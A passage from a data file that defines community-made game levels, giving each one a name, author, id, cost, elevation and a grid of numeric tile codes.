,0,0,0,0,0,0,0,0,0,0,7,5,5,7,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,5,5,7,0,0,0,0,9,9,7,9,7,7,9,9,0,9,5,5,7,5,5,5,5,26,27,26,5,5,5,5,26,27,26,5,5,5,5,5,0,5,5,5,5,26,27,26,5,5,5,5,26,27,26,5,5,5,5,5,7,7,134,7,7,0,0,0,5,5,7,7,7,0,7,7,1,7,132,7,0,1,7,1,0,0,0,0,5,5,0,0,0,0,0,0,0,1,7,1,0,0,1,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,1,0]});
maps.push({name="Wrong Temple",author="jeSUS",id="#1663885811",direction="forward",cost=392,elevation=17,map=[0,0,0,0,1,1,1,1,1,1,1,1,0,0,1,1,1,2,2,1,99,22,22,24,22,22,22,1,16,132,132,1,1,1,11,11,45,45,45,1,22,22,22,24,22,22,22,1,16,16,16,1,0,11,95,11,45,45,45,1,1,98,98,1,22,22,22,1,16,16,16,1,0,11,95,11,45,45,45,1,1,95,95,1,22,22,22,1,16,16,16,1,0,11,11,1,46,46,46,1,0,22,22,1,22,22,1,16,98,16,16,1,0,127,127,1,46,46,46,1,0,22,22,1,22,22,1,133,98,16,16,1,0,0,0,1,46,46,46,1,0,24,24,1,22,22,1,1,0,16,0,1,0,0,0,1,47,47,47,1,0,22,22,1,95,95,0,0,0,16,0,0,0,0,0,1,95,95,95,1,0,22,22,1,22,22,0,0,0,92,0,0,0,0,0,1,47,47,47,1,0,22,22,1,22,22,0,0,0,0,0,0,0,12,12,1,48,48,48,1,1,95,95,1,24,24,0,0,0,0,0,0,12,65,65,1,48,48,48,1,0,24,24,1,22,22,0,0,0,0,0,0,12,65,65,1,48,48,48,1,0,22,22,1,22,22,22,22,0,0,0,0,1,12,12,1,48,48,48,1,0,22,22,1,22,22,22,22,16,16,0,1,1,14,14,1,49,49,49,1,0,22,22,1,22,22,22,22,16,16,1,133,98,12,12,1,49,49,49,1,0,22,22,1,22,22,22,22,141,16,1,12,98,12,12,1,49,49,49,1,0,22,22,1,22,22,22,22,141,16,1,1,1,95,95,1,3,3,3,1,0,22,22,1,134,22,22,22,16,16,1,0,1,131,131,1,15,15,15,1,0,2,2,1,1,1,1,1,1,1,1,0,1,1,1,1,93,15,94,1]});
maps.push({name="Steve",author="mangaka7",id="#1663889086",direction="forward",cost=412,elevation=0,map=[105,105,105,105,105,105,105,59,59,59,59,59,59,2,2,59,59,59,59,59,105,105,105,105,105,105,105,59,59,59,59,59,59,59,59,59,59,59,59,59,105,105,105,105,105,105,105,59,59,59,59,59,59,59,59,59,59,59,59,59,105,105,105,105,105,59,59,59,59,59,0,0,59,59,59,59,59,59,59,59,105,105,105,105,105,59,59,59,59,59,0,0,59,59,3,59,59,59,59,59,105,105,105,105,105,59,59,59,59,59,70,70,59,59,105,105,105,105,105,105,105,105,105,105,105,59,59,59,59,59,70,70,59,59,105,105,105,105,105,105,105,105,105,105,105,59,59,59,59,59,59,59,105,105,115,115,115,105,105,105,105,105,105,105,105,59,59,59,59,59,59,59,105,105,115,115,115,105,105,105,105,105,105,105,105,59,59,59,59,59,59,59,105,105,115,100,115,105,105,105,105,105,105,105,105,59,59,59,59,59,59,59,105,105,115,115,115,3,105,105,105,105,105,105,105,59,59,59,59,59,59,59,105,105,115,115,115,105,105,105,105,105,105,105,105,59,59,59,59,59,59,59,105,105,115,115,115,105,105,105,105,105,105,105,105,59,59,59,59,59,70,70,59,59,105,105,105,105,105,105,105,105,105,105,105,59,59,59,59,59,70,70,59,59,105,105,105,105,105,105,105,105,105,105,105,59,59,59,59,59,0,0,59,59,3,59,59,59,59,59,105,105,105,105,105,59,59,59,59,59,0,0,59,59,59,59,59,59,59,59,105,105,105,105,105,105,105,59,59,59,59,59,59,59,59,59,59,59,59,59,105,105,105,105,105,105,105,59,59,59,59,59,59,59,59,59,59,59,59,59,105,105,105,105,105,105,105,59,59,59,59,59,59,2,2,59,59,59,59,59]});
maps.push({name="Low Grav Choke",author="MoistNoodlez",id="#1663897141",direction="forward",cost=224,elevation=0,map=[0,0,0,0,0,0,1,14,2,2,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,14,140,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,140,19,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,14,140,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,140,19,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,19,140,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,140,14,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,19,140,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,19,140,14,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,14,140,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,140,14,14,140,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,2,2,14,1,0,0,0,0,0,0,0,0]});
maps.push({name="Original Rock Climb",author="MoistNoodlez",id="#1663897554",direction="forward",cost=302,elevation=19,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,15,13,13,13,11,11,11,9,9,9,7,7,7,5,5,5,5,5,1,1,15,13,13,13,11,11,11,9,9,9,7,7,7,5,5,5,88,88,1,1,15,15,1,1,1,1,1,1,1,1,1,1,1,5,5,5,5,5,1,1,15,15,1,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,1,15,15,1,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,1,15,15,1,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,1,17,17,1,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,1,17,17,1,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,1,17,17,1,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,1,17,17,1,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,1,19,19,1,0,0,0,0,0,0,0,0,0,1,141,141,141,141,141,1,1,19,19,1,0,0,0,0,0,0,0,0,0,1,24,24,24,24,24,1,1,19,19,1,0,0,0,0,0,0,0,0,0,1,24,24,24,24,24,1,1,19,19,1,0,0,0,0,0,0,0,0,0,1,24,24,24,24,24,1,1,21,21,1,0,0,0,0,0,0,0,0,0,1,24,24,24,24,24,1,1,21,21,1,1,1,1,1,1,1,1,1,1,1,24,24,24,24,24,1,1,21,23,23,23,23,24,24,24,24,24,24,24,24,24,24,24,24,24,1,1,21,23,23,23,23,24,24,96,96,24,24,24,24,24,24,97,24,24,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="someone trigger",author="sivi",id="#1663931535",direction="forward",cost=315,elevation=-3,map=[1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,2,2,1,9,9,9,9,1,0,0,0,1,1,1,1,1,1,1,0,0,12,12,1,134,134,134,134,1,0,0,0,1,5,5,110,5,94,1,0,0,12,12,1,9,9,9,9,1,0,0,0,1,5,5,110,5,5,1,0,0,12,12,1,9,9,1,1,1,1,1,1,1,5,5,1,5,5,1,0,0,12,12,0,9,9,0,0,0,1,97,9,108,5,5,5,5,141,112,0,0,12,12,0,9,9,0,0,0,1,9,9,108,5,5,5,5,141,112,0,0,12,12,0,9,9,0,0,0,1,125,125,1,1,1,1,1,1,1,0,0,12,12,0,9,9,0,0,0,1,19,19,1,0,0,0,0,0,0,0,0,12,12,0,127,9,1,1,1,1,16,16,1,1,1,1,1,1,1,1,1,12,12,0,5,141,1,133,116,98,16,16,115,115,114,114,113,113,112,112,96,12,12,0,5,5,1,133,116,98,16,16,115,115,114,114,113,113,112,112,96,12,12,0,5,5,1,1,1,1,16,16,1,1,1,1,1,1,1,1,1,12,12,0,5,5,15,94,1,9,3,3,1,93,116,116,1,0,0,0,0,0,0,0,5,5,15,100,1,9,9,9,1,133,116,99,1,0,0,0,0,0,0,0,5,5,15,93,1,9,9,9,1,1,116,116,1,0,0,0,0,0,0,0,9,9,1,1,1,9,131,9,65,65,65,65,1,0,0,0,0,0,0,0,9,9,0,0,1,9,9,9,65,65,65,65,1,0,0,0,0,0,0,0,9,9,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Endless Copse",author="sivi",id="#1663950823",direction="forward",cost=216,elevation=4,map=[0,0,0,0,0,0,1,1,1,2,2,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,1,5,90,5,5,90,5,1,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,1,5,5,1,0,0,0,0,0,0,0,0,0,0,1,1,1,5,5,1,1,5,5,1,1,1,0,0,0,0,0,0,0,0,1,100,13,5,5,13,13,5,5,13,13,1,0,0,0,0,0,0,0,0,1,139,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,1,5,5,6,5,1,1,5,6,5,12,1,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,1,5,5,7,5,5,5,5,7,5,11,1,0,0,0,0,0,0,0,0,1,5,5,5,5,9,9,5,5,5,5,1,0,0,0,0,0,0,0,0,1,5,5,8,5,9,9,5,8,5,10,1,0,0,0,0,0,0,0,0,1,5,5,5,5,9,9,5,5,5,5,1,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,1,1,9,9,90,9,9,90,9,9,1,1,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0]});
maps.push({name="Endless Copse",author="sivi",id="#1663950862",direction="left",cost=310,elevation=8,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,105,105,1,1,1,1,1,1,1,1,1,1,0,1,1,0,0,33,5,45,45,45,45,5,45,5,32,100,5,5,5,1,1,1,0,0,0,33,5,5,5,5,5,5,45,5,32,32,5,5,5,5,1,1,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,33,33,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,13,1,1,33,33,0,0,5,5,5,5,5,5,5,5,5,5,5,139,6,13,1,1,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,7,13,1,1,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,8,13,1,1,33,33,0,0,10,96,96,96,10,5,5,5,5,5,5,5,9,13,1,1,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,10,13,1,1,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,11,13,1,1,13,90,13,31,29,27,25,0,0,0,0,5,5,5,5,5,12,139,1,2,13,13,13,13,90,13,1,0,0,0,1,13,90,13,13,90,13,13,1,2,13,13,13,13,13,13,13,0,0,0,13,13,13,13,13,13,13,13,1,1,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Overrislet",author="Frid",id="#1664037886",direction="forward",cost=291,elevation=14,map=[0,0,0,0,0,0,0,0,0,0,93,94,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,128,34,0,34,34,0,0,0,10,10,0,0,0,90,16,90,0,0,0,0,0,1,0,0,0,0,0,0,10,10,0,0,0,16,65,65,0,0,0,1,1,1,112,65,1,1,1,0,10,10,0,0,0,90,65,65,0,0,0,24,24,97,1,5,1,65,1,0,10,10,0,0,0,16,65,65,0,0,0,0,0,24,1,141,114,65,1,0,10,10,0,0,0,16,16,16,0,0,0,0,18,1,1,1,1,65,112,0,10,10,0,0,0,127,127,0,0,0,0,0,125,0,10,1,5,5,112,0,10,10,0,0,0,0,0,1,1,1,1,0,0,0,125,1,65,5,1,0,10,10,0,0,0,0,0,1,90,90,1,1,0,0,0,110,65,5,1,0,10,10,0,0,0,0,0,1,115,115,114,1,1,0,0,1,107,107,1,0,10,10,0,0,0,0,0,15,115,115,114,113,1,1,0,1,108,108,1,0,10,10,0,0,0,15,15,15,90,1,90,113,112,1,1,1,109,109,1,0,10,10,0,0,0,15,15,15,90,1,1,90,112,111,110,96,110,110,110,10,10,10,0,0,0,90,15,0,0,0,1,1,90,111,110,96,110,90,110,10,10,90,0,0,0,90,15,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,90,15,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,132,132,1,15,15,0,0,1,0,90,24,24,90,90,24,24,24,24,90,24,24,24,1,15,15,0,0,1,0,24,24,24,24,24,24,24,90,24,24,24,24,24,1,131,131,0,0,1,0,2,2,0,0,0,0,0,0,0,0,1,1,1,1]});
maps.push({name="Icecapped",author="sivi",id="#1664041919",direction="left",cost=442,elevation=3,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,6,6,1,1,1,1,1,1,1,1,0,5,66,66,66,66,66,66,66,66,6,6,6,7,8,9,10,10,10,1,0,5,66,66,66,66,66,66,66,66,6,6,6,7,8,9,10,10,10,1,0,5,66,66,66,66,66,66,66,66,6,6,6,139,6,6,6,10,10,1,0,5,66,66,66,66,66,66,66,66,6,6,6,6,6,6,6,11,11,1,0,5,66,66,66,5,5,5,5,66,6,6,6,6,6,6,6,12,12,1,0,5,66,66,66,5,5,5,5,66,6,6,6,6,6,6,6,13,13,1,1,5,66,66,66,66,66,66,66,66,6,6,46,46,46,46,6,13,93,115,24,5,66,66,66,66,6,6,6,6,6,6,46,46,46,46,6,13,94,90,24,5,66,66,66,66,6,6,6,6,6,6,46,46,46,46,6,13,93,90,24,5,66,66,66,66,66,66,66,66,6,6,46,46,46,46,6,13,94,115,24,5,66,66,66,5,5,5,5,66,6,6,6,6,6,6,6,13,13,1,1,5,66,66,66,5,5,5,5,66,6,6,6,6,6,6,6,12,12,1,0,5,66,66,66,66,66,66,66,66,6,6,6,6,6,6,6,11,11,1,0,5,66,66,66,66,66,66,66,66,6,6,6,139,6,6,6,10,10,1,0,2,9,9,9,9,8,7,6,6,6,6,6,7,8,9,10,10,10,1,0,2,9,9,9,9,8,7,6,6,6,6,6,7,8,9,10,10,10,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="real ending",author="sivi",id="#1664046689",direction="forward",cost=101,elevation=0,map=[0,0,0,0,0,0,0,0,11,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,11,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,11,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,1,139,90,139,1,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,11,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,45,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,11,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,1,139,90,139,1,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,11,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,11,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,1,139,90,139,1,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,11,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,11,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,11,11,11,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,11,13,11,11,11,13,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,2,2,11,0,0,0,0,0,0,0,0]});
maps.push({name="secret",author="Headhunterz",id="#1664052025",direction="forward",cost=187,elevation=0,map=[0,0,0,0,0,1,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,24,24,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,118,58,143,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,118,58,143,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,118,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,92,1,24,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,1,24,24,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,18,143,1,24,24,1,0,0,0,0,0,0,0,0,0,1,118,118,118,1,1,0,1,24,24,1,0,0,0,0,0,0,0,0,0,1,118,94,94,1,1,0,1,24,132,1,0,0,0,0,0,0,0,0,0,1,118,94,94,1,18,142,1,24,24,1,0,0,0,0,0,0,0,0,0,1,118,94,94,1,1,0,1,24,24,1,0,0,0,0,0,0,0,0,0,1,118,118,118,1,1,0,1,24,24,1,0,0,0,0,0,0,0,0,0,1,118,93,93,118,118,118,1,24,24,1,0,0,0,0,0,0,0,0,0,1,118,93,93,1,1,118,1,24,24,1,0,0,0,0,0,0,0,0,0,1,118,93,93,1,1,131,1,24,24,1,0,0,0,0,0,0,0,0,0,1,118,118,118,1,1,1,1,24,24,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,24,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="Dont Edge",author="sivi",id="#1664058801",direction="right",cost=317,elevation=4,map=[0,11,11,11,11,11,11,11,11,11,0,90,2,2,90,0,0,93,93,0,0,11,5,5,5,5,5,5,5,11,0,6,6,6,6,0,0,10,10,0,0,11,5,7,5,9,5,7,5,11,0,6,6,6,6,0,0,85,87,0,0,11,5,5,5,5,5,5,5,11,0,6,6,6,6,0,0,10,10,0,0,11,45,45,11,11,11,45,45,11,0,90,6,6,90,0,0,87,85,0,0,11,45,45,11,97,11,45,45,11,0,6,6,6,6,0,0,10,10,0,0,11,45,45,94,94,94,45,45,11,0,6,6,6,6,0,0,85,87,0,0,11,45,45,45,45,45,45,45,11,0,6,6,6,6,0,0,10,10,0,0,11,45,11,45,11,45,11,45,11,0,90,6,6,90,0,0,87,85,0,0,11,139,127,139,127,139,127,139,11,0,6,6,6,6,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,85,87,0,0,90,6,6,6,90,6,6,6,90,6,6,6,6,6,0,0,10,10,0,0,6,6,6,6,6,6,6,6,6,6,90,6,6,90,0,90,10,10,90,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,96,96,10,132,10,10,10,10,10,10,10,10,10,10,10,10,10,10,2,10,96,96,10,132,10,10,10,10,10,10,10,10,10,10,10,10,10,10,2,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,6,6,6,6,6,6,6,6,6,6,6,6,6,131,0,90,88,88,90,0,90,6,6,6,90,6,6,6,90,6,6,6,6,131,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="dawds",author="alli",id="#1664089266",direction="left",cost=321,elevation=11,map=[0,0,0,0,0,1,106,1,112,1,2,2,1,0,0,0,0,0,0,0,0,0,0,1,1,112,46,112,112,1,112,112,112,1,0,0,0,0,0,0,0,0,1,112,112,112,106,1,91,1,91,1,112,112,1,0,0,0,0,0,0,0,1,112,1,1,108,110,112,112,112,112,1,112,1,0,0,0,0,0,0,1,114,113,1,0,1,1,112,112,112,112,1,112,1,1,1,0,0,0,0,1,114,1,0,0,0,1,112,112,112,112,1,112,112,112,112,1,0,0,0,1,114,1,1,1,1,1,1,111,111,1,1,1,1,1,111,1,0,0,1,12,13,9,9,9,9,9,9,10,10,9,9,9,9,9,10,9,1,0,1,11,10,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,1,0,1,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,1,0,1,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,1,0,1,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,1,0,23,9,9,9,9,9,9,9,15,13,13,11,9,9,9,9,9,1,0,0,2,23,141,9,9,9,9,11,13,100,13,9,9,9,9,9,9,1,0,0,2,23,141,9,9,9,9,9,13,13,15,9,9,9,9,9,9,1,0,0,23,9,9,9,9,9,9,9,9,9,11,9,9,9,9,9,9,1,0,0,1,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,1,0,0,0,43,1,1,9,9,9,9,9,9,9,9,9,9,9,9,9,1,0,0,0,0,0,43,1,1,1,9,9,9,9,9,9,9,1,1,1,0,0,0,0,0,0,0,94,43,93,1,1,1,1,1,1,1,0,0,0,0,0,0,0]});
maps.push({name="Flank tunnel",author="swarm",id="#1664139003",direction="forward",cost=182,elevation=4,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,0,15,15,0,0,0,0,0,0,0,0,0,0,24,57,57,55,55,55,15,15,15,15,0,0,0,0,0,0,0,0,0,0,24,131,57,55,55,55,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,24,24,55,55,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,55,55,24,0,0,0,0,0,0,0,24,24,24,24,24,0,0,0,0,24,55,55,24,0,0,0,0,0,0,24,55,55,55,58,132,24,0,0,0,24,55,55,24,24,0,0,0,0,24,24,55,55,55,58,58,24,0,0,0,24,55,55,55,55,15,15,15,15,55,55,55,55,24,24,24,0,0,0,0,24,55,55,55,55,15,15,15,15,55,55,55,55,24,0,0,0,0,0,0,0,24,24,24,24,0,15,15,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,21,0,22,93,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,0,0,0,0,0,0,0,0,0,0,0,20,0,19,19,17,17,15,15,17,17,19,19,0,0,0,0,0,0,0,0,0,0,19,19,17,17,15,15,17,17,19,19,19,19,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,94,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,24,24,24,24,2,2,24,24,24,24,0,0,0,0,0,0]});
maps.push({name="Unlucky",author="Headhunterz",id="#1664141487",direction="right",cost=194,elevation=0,map=[0,0,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,1,0,0,0,0,132,17,17,17,17,17,17,17,17,17,17,0,0,17,17,1,0,0,0,0,17,17,93,93,93,93,17,94,94,94,17,0,0,17,17,1,0,0,0,0,17,17,93,93,93,93,17,94,94,94,17,0,0,17,17,1,0,0,0,0,17,17,93,93,93,93,17,94,94,94,17,0,0,17,17,1,0,0,0,0,17,17,93,93,93,93,17,94,94,94,17,0,0,17,17,1,0,0,0,0,133,17,17,17,17,17,17,17,17,17,17,0,0,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,1,132,132,132,132,132,132,132,132,134,17,17,17,17,17,2,0,0,131,131,1,132,132,132,132,132,132,132,132,132,17,17,17,17,17,2,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="spam jump",author="Headhunterz",id="#1664143450",direction="forward",cost=169,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,0,0,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,16,16,0,0,0,0,0,0,1,0,0,0,0,0,0,16,16,16,0,0,16,16,0,0,0,0,0,1,114,1,0,0,0,0,0,97,16,16,0,94,16,16,1,1,1,1,1,1,143,1,1,1,1,1,1,16,16,16,0,94,16,16,92,0,0,0,0,0,143,0,0,0,0,16,1,16,16,93,0,1,1,1,1,1,1,1,1,1,143,1,1,1,1,1,1,16,16,93,0,94,0,0,0,0,0,0,0,1,114,14,14,15,15,16,16,16,16,16,0,0,0,0,0,0,0,0,0,1,114,1,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,15,93,1,16,0,0,0,0,0,0,2,2,0]});
maps.push({name="Trigger Tower 8",author="TF2 Pencil",id="#1664165395",direction="forward",cost=249,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,5,5,1,1,1,1,1,1,1,0,0,0,0,1,14,141,9,9,9,1,5,5,1,46,0,47,0,48,1,0,0,0,0,1,14,9,9,5,141,1,5,5,1,0,0,0,0,0,1,0,0,0,0,1,14,14,0,5,5,105,5,5,105,45,0,0,0,49,1,0,0,0,0,1,141,14,19,24,24,1,5,5,1,0,0,0,0,0,1,0,0,0,0,1,19,19,141,24,97,1,5,5,1,97,24,3,10,50,1,0,0,0,0,1,1,1,1,1,1,1,96,96,1,1,1,1,1,1,1,0,0,0,0,99,5,0,0,5,0,0,5,5,0,0,5,0,0,5,99,0,0,0,0,5,5,0,0,5,0,0,5,5,0,0,5,0,0,5,5,0,0,0,0,1,1,1,1,1,1,1,98,98,1,1,1,1,1,1,1,0,0,0,0,1,5,5,92,24,102,1,5,5,1,102,24,4,19,19,1,0,0,0,0,1,0,0,0,24,24,1,5,5,1,24,24,19,14,4,1,0,0,0,0,1,25,0,24,0,25,105,5,5,105,5,5,0,14,14,1,0,0,0,0,1,0,0,0,0,0,1,5,5,1,4,5,9,9,14,1,0,0,0,0,1,25,0,25,0,25,1,5,5,1,9,9,9,4,14,1,0,0,0,0,1,1,1,1,1,1,1,101,101,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
